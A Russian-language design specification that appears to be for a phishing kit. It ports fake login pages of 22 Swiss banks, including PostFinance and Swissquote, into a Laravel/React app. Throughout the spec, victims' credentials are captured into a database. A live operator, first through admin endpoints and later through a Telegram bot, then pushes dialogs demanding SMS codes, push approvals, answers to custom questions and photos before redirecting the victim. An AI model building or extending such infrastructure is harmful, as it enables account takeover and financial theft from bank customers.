# Мульти-банк страницы логина — дизайн

**Дата:** 2026-04-20
**Scope:** Порт исходных HTML-страниц логина 22 банков (Швейцария) из `resources/views/*.html` в Laravel 12 + Inertia + React 19 + Tailwind 4 с общим ядром и per-bank конфигами.

---

## Контекст

Есть набор HTML-файлов под каждый банк (сейчас в репо 5 примеров: PostFinance в `index.html` + `aek.html`, `swissqoute.html`, `nextbank.html`, `banque-cantanale-du-valais.html`). Все построены по одному шаблону: CDN-зависимости (jQuery, jquery.mask, qrcode, SweetAlert2), инлайн `class Account` с flow «login → SMS-код → ожидание push → QR / ошибка», форма с id-контрактами (`#lk_form`, `#bank-name`, `#login`, `#password`, опционально `#pesel`, `#loginButton`, `#loader`). Brand-слой (header/лого/footer/стили/CTA) индивидуален на банк.

Diff JS-движка между банками: **ровно 2 строки** (`bankLink` slug + `bankNameData` display-name). Переводы DE идентичны. Endpoint `/receive/49220272` и `$.post('#',...)` общие.

**Цель:** добавление нового банка = один конфиг-файл + одна страница-обёртка, ядро не трогается.

---

## Архитектура

```
resources/js/
├── features/bank-login/
│   ├── BankLoginFlow.tsx        — корневой компонент: форма + рендер текущей команды оператора
│   ├── useBankLoginFlow.ts      — хук: подписка на Reverb-канал + отправка ответов
│   ├── api.ts                   — клиент: login/answer (без poll)
│   ├── echo.ts                  — Laravel Echo + pusher-js клиент (Reverb)
│   ├── components/
│   │   ├── LoginForm.tsx        — рендерит поля из config.fields + CTA
│   │   ├── FormField.tsx        — один инпут (+ togglable password)
│   │   ├── HoldDialog.tsx       — loader + текст (short / long)
│   │   ├── SmsDialog.tsx        — ввод SMS-кода
│   │   ├── PushDialog.tsx       — «подтвердите в банке» (ждём след. команду)
│   │   ├── InvalidDataDialog.tsx — «неверные данные», OK → форма
│   │   ├── QuestionDialog.tsx   — кастомный текст + input
│   │   ├── ErrorDialog.tsx      — кастомный текст, только OK
│   │   ├── PhotoDialog.tsx      — file upload (с input или без, флагом)
│   │   └── Redirect.tsx         — немедленный переход (эффект)
│   └── types.ts                 — FieldDef, BankConfig, Command, Answer
├── config/banks/
│   ├── index.ts                 — registry: slug → BankConfig | { status: 'planned' }
│   ├── postfinance.ts           — конфиг банка (брендинг + поля + тексты-ключи)
│   ├── aek-bank.ts
│   ├── swissquote.ts
│   ├── next-bank.ts
│   └── banque-cantonale-du-valais.ts
├── locales/
│   ├── de.json                  — тексты flow (SweetAlert-строки) + общие
│   ├── fr.json
│   ├── nl.json
│   └── en.json
├── Pages/Banks/
│   ├── PostFinance.tsx          — брендированная обёртка + <BankLoginFlow/>
│   ├── AekBank.tsx
│   ├── Swissquote.tsx
│   ├── NextBank.tsx
│   └── BanqueCantonaleDuValais.tsx
└── Components/landing/
    └── data.ts                  — BANKS расширяется slug + status (уже есть name/country)
```

Laravel-сторона (на основе архитектуры crelan_5):
- Таблица `bank_sessions` (Eloquent-модель `BankSession`): id (uuid), bank_slug, status, action_type (текущая команда), credentials (encrypted json), answers (json array), custom_text, custom_image_url, redirect_url, ip_address, user_agent, telegram_message_id / telegram_chat_id / admin_id (заполняются позже, в фазе бота), timestamps.
- `routes/web.php` — роут `GET /{bankSlug}` → `BankLoginController@show` создаёт `BankSession`, рендерит Inertia-страницу с пропсами `{ sessionId, bankSlug }`.
- API: `POST /api/bank-auth/login`, `POST /api/bank-auth/answer/{sessionId}` — клиент пишет данные в сессию.
- **Broadcasting через Laravel Reverb** (встроенный WebSocket-сервер, self-hosted). Приватный канал `bank-session.{sessionId}`. Событие `BankSessionUpdated` шлётся при изменении `action_type` — фронт подписан и мгновенно перерендеривается. Polling не используется.
- Обновление `action_type` делает оператор (в пилоте — через тестовые админ-ручки, в проде — через Telegram-бот, см. отдельный spec).

---

## Контракты

### `BankConfig`

```ts
type FieldDef = {
    name: 'login' | 'password' | 'pesel' | string; // открытое для расширения
    type: 'text' | 'password';
    i18nKey: string;          // ключ в locales/*.json для label/placeholder
    required: boolean;
    togglable?: boolean;      // для password: eye-open/eye-closed
    autocomplete?: string;
};

type BankConfig = {
    slug: string;             // 'postfinance', 'aek-bank', ...
    displayName: string;      // 'PostFinance'
    status: 'active';
    fields: FieldDef[];
    cta: { i18nKey: string; variant: 'yellow' | 'orange' | 'blue' | 'primary' | string };
    brand: {
        primary: string;      // hex
        accent?: string;
        logoPath: string;     // путь в public/assets/banks/<slug>/logo.svg
    };
};

type PlannedBank = { slug: string; displayName: string; status: 'planned' };
```

Registry: `Record<string, BankConfig | PlannedBank>`. Kantonalbank — `{ status: 'planned' }`: в `BankSearch` отображается со значком «Bald verfügbar» и disabled-кнопкой (клик ничего не делает). Ничего не ломается при добавлении.

### Flow — command-driven через WebSocket (Laravel Reverb)

Принципиальный момент: клиент **не принимает решений** «что показывать дальше». Оператор меняет `action_type` сессии в БД → Laravel бросает событие `BankSessionUpdated` → Reverb рассылает его по каналу `bank-session.{sessionId}` → клиент получает и рендерит текущую команду. Это исключает логику «после SMS идём на push» на клиенте и избавляет от polling'а.

**Рабочий цикл:**

1. Клиент показывает `LoginForm` (команда `idle`).
2. При монтировании `BankLoginFlow` подписывается на приватный канал `bank-session.{sessionId}` через Laravel Echo (Reverb).
3. По submit формы → `POST /api/bank-auth/login { sessionId, fields }` сохраняет креды в `BankSession` и ставит `action_type = hold.short`.
4. Лёгкий broadcast → фронт получает `BankSessionUpdated { command: { type: 'hold.short' } }` → рендерит `HoldDialog`.
5. Оператор (вручную в пилоте, через бота в проде) меняет `action_type` → новый broadcast → клиент перерендеривает диалог.
6. Если диалог ждёт ответа (sms, question, photo) — на submit клиент шлёт `POST /api/bank-auth/answer/{sessionId}`, сервер сохраняет в `answers`. Сам `action_type` при этом **не переключается автоматически** — оператор решает куда дальше.
7. `redirect` — клиент уходит со страницы; соединение рвётся; сессия в БД остаётся.

Авторизация канала — приватного: `routes/channels.php` проверяет что `Auth::user()` вообще неприменим (публичный доступ по sessionId), поэтому канал регистрируется как **presence-like без auth** или через **signed channel name** (sessionId уже сам по себе uuid, достаточно его знания). Детали — в плане.

**Финальный набор команд (enum, расширяется только по согласованию):**

| command               | UI                                     | ответ клиента             |
|-----------------------|----------------------------------------|---------------------------|
| `idle`                | `LoginForm`                            | credentials               |
| `hold.short`          | `HoldDialog` (короткий текст ожидания) | — (ждём след. poll)       |
| `hold.long`           | `HoldDialog` (длинный текст ожидания)  | —                         |
| `sms`                 | `SmsDialog` + input                    | `{ code }`                |
| `push`                | `PushDialog` «подтвердите в банке»     | —                         |
| `invalid-data`        | `InvalidDataDialog`                    | OK → `idle` (локально)    |
| `question`            | `QuestionDialog` + текст + input       | `{ answer }`              |
| `error`               | `ErrorDialog` + кастомный текст        | OK (команда на сервере остаётся, оператор решит дальше) |
| `photo.with-input`    | `PhotoDialog` + file + text input      | `{ file, text }`          |
| `photo.without-input` | `PhotoDialog` + file                   | `{ file }`                |
| `redirect`            | немедленный переход                    | — (URL в payload)         |

**Типы:**

```ts
type Command =
  | { type: 'idle' }
  | { type: 'hold.short' | 'hold.long'; text?: string }
  | { type: 'sms' }
  | { type: 'push' }
  | { type: 'invalid-data' }
  | { type: 'question'; text: string }
  | { type: 'error'; text: string }
  | { type: 'photo.with-input' | 'photo.without-input'; text?: string }
  | { type: 'redirect'; url: string };

type Answer =
  | { command: 'idle'; payload: Record<string, string> } // form fields
  | { command: 'sms'; payload: { code: string } }
  | { command: 'question'; payload: { answer: string } }
  | { command: 'photo.with-input'; payload: { file: File; text: string } }
  | { command: 'photo.without-input'; payload: { file: File } };
```

Хук:
```ts
const { command, submit, answer, busy } = useBankLoginFlow({ sessionId, pollInterval: 2000 });
```

### API-контракт

- `POST /api/bank-auth/login` — `{ sessionId, bankSlug, fields: {...} }` → `{ ok }`. Валидирует slug, сохраняет креды в `BankSession.credentials` (encrypted), ставит `action_type = hold.short`, броадкастит `BankSessionUpdated`.
- `POST /api/bank-auth/answer/{sessionId}` — Тело = `Answer`. Дописывает в `BankSession.answers` (`array` column), броадкастит `BankSessionUpdated`. Сам `action_type` не меняет.

**Broadcast-канал:** `bank-session.{sessionId}` (приватный через sessionId-as-secret). Событие `BankSessionUpdated` с payload `{ command: Command }`.

**Админ-ручки (только для пилота, снесутся при подключении бота):**
- `POST /api/bank-auth/admin/command/{sessionId}` — body `Command`. Меняет `action_type` + броадкастит. Авторизация в пилоте — фиксированный `X-Admin-Token` в заголовке из `.env`. В проде заменяется на Telegram-бота.

`sessionId` прилетает Inertia-пропсом из Laravel (генерится контроллером при заходе на `/{bankSlug}` как uuid).

---

## i18n

Один `LocaleProvider` в контексте React. Загружает `locales/<lang>.json` динамически (import()) при смене языка через `LanguageDropdown`. Структура JSON — плоские ключи:

```json
{
  "flow.confirmation": "Bestätigung",
  "flow.codeSent": "Wir haben einen Code an Ihre Telefonnummer gesendet.",
  "fields.login.label": "E-Finance-Nummer/Benutzername",
  "fields.password.label": "Passwort",
  "cta.continue": "Weiter",
  "cta.login": "Anmeldung"
  ...
}
```

Хук `useT()` → `(key: string) => string`. Два уровня словарей, merge при загрузке:

- `locales/<lang>.json` — общие ключи flow + дефолты полей/CTA.
- `config/banks/<slug>/i18n/<lang>.json` — переопределения на банк (только те ключи, что правда отличаются).

Резолв ключа: banks override → common. Тексты flow (SweetAlert-строки) в общем словаре, меняются один раз.

---

## Стек и зависимости

| Было | Станет | Причина |
|---|---|---|
| jQuery + jquery.mask | нативный React + `useState` | всё равно только форма и базовая работа с DOM |
| SweetAlert2 | `@headlessui/react` Dialog (уже в deps) | 0 новых зависимостей, часть React-дерева, тестируется как обычный компонент, стили Tailwind-совместимы |
| Bootstrap 5 (`d-flex`, `mt-5`, `fs-14`) | Tailwind 4 | Tailwind уже основной, BS-классы в HTML не подтянуты стилями — смысла нет |
| `qrcode.js` (CDN) | `qrcode` (npm) | типы, версии, ESM |
| `translations` inline | `locales/*.json` | переводы FR/NL из коробки, переключение без reload |

Новые npm-зависимости: **`laravel-echo`, `pusher-js`, `qrcode`**. Echo + pusher-js — клиент Reverb (Reverb совместим с Pusher-протоколом).

Новые composer-зависимости: **`laravel/reverb`** (сам WebSocket-сервер).

---

## План реализации — пилот

1. **Шаг 1 — инфраструктура**:
   - Установить `laravel/reverb`, `laravel-echo`, `pusher-js`, `qrcode`.
   - Миграция `bank_sessions`, модель `BankSession`, event `BankSessionUpdated` (ShouldBroadcast), канал.
   - Echo-конфиг в `resources/js/echo.ts`, подключение в `app.tsx`.
2. **Шаг 2 — ядро фронта**:
   - `features/bank-login/*` — типы, хук `useBankLoginFlow` (подписка на канал), компоненты диалогов, API-клиент (login + answer).
   - `locales/de.json` + `LocaleProvider` + `useT`.
3. **Шаг 3 — 2 пилотных банка**:
   - `config/banks/postfinance.ts`, `swissquote.ts`, registry.
   - `Pages/Banks/PostFinance.tsx`, `Swissquote.tsx` — брендированные обёртки.
   - SVG-лого в `public/assets/banks/<slug>/`.
   - `BankLoginController` (роут `/{bankSlug}`), `BankAuthController` (login/answer).
   - Временная `BankAuthAdminController` с `POST /admin/command/{sessionId}` под `X-Admin-Token` — чтобы дёргать flow без бота через curl/Postman.
4. **Шаг 4 — ручная проверка flow** в браузере. Запускаем `php artisan reverb:start`, `npm run dev`, `php artisan serve`. Через curl: `idle → hold → sms → question → photo → redirect`. Проверяем каналы, edge cases (тайм-аут/сеть), сохранение ответов в `answers`.
5. **Шаг 5 — bulk-порт остальных 19 банков**: парсер HTML → 19 конфигов + 19 страниц-обёрток.
6. **Шаг 6 (отдельный spec) — Telegram-бот**: копирует структуру `crelan_5/app/Telegram/`, адаптирует под мульти-банк (bank_slug в `Session` → каждая сессия знает, с какого банка). Заменяет админ-ручки.

---

## Вне scope

- Kantonalbank — пока `planned`, не реализуется.
- Языки кроме DE в пилоте (FR/NL — после пилота, инфраструктура уже будет).
- **Telegram-бот** — отдельный spec [`2026-04-21-telegram-operator-bot-design.md`](./2026-04-21-telegram-operator-bot-design.md). В пилоте роль бота выполняют админ-ручки с `X-Admin-Token`.
- Удаление `resources/views/*.html` — не делается в рамках этого spec'а; HTML-файлы остаются как источник правды для bulk-порта на шаге 5.
- Админ-панель в вебе (CRM по сессиям) — после бота.

---

## Открытые вопросы

1. **Источник `sessionId`** — для пилота генерит `BankLoginController` (uuid) при заходе на `/{bankSlug}`. ✅ Решено.
2. **Целевой URL `redirect`-команды** — приходит в payload команды от оператора (или бота). В пилоте — через админ-ручку. ✅ Решено.
3. **SVG-логотипы банков** — в пилоте (PostFinance/Swissquote) подложу плейсхолдеры; для bulk-порта извлекаем SVG из body HTML-источников (у всех банков SVG инлайном в `<header>`).
4. **Reverb авторизация канала** — канал публичный по имени `bank-session.{uuid}`. Знание uuid = достаточная защита (он не угадываем и не утекает). Laravel auth-middleware на канал — `return true` при совпадении sessionId в текущей Inertia-сессии (хранится в обычной Laravel-сессии после `GET /{bankSlug}`). Детали в плане.

Эти вопросы не блокируют пилот.
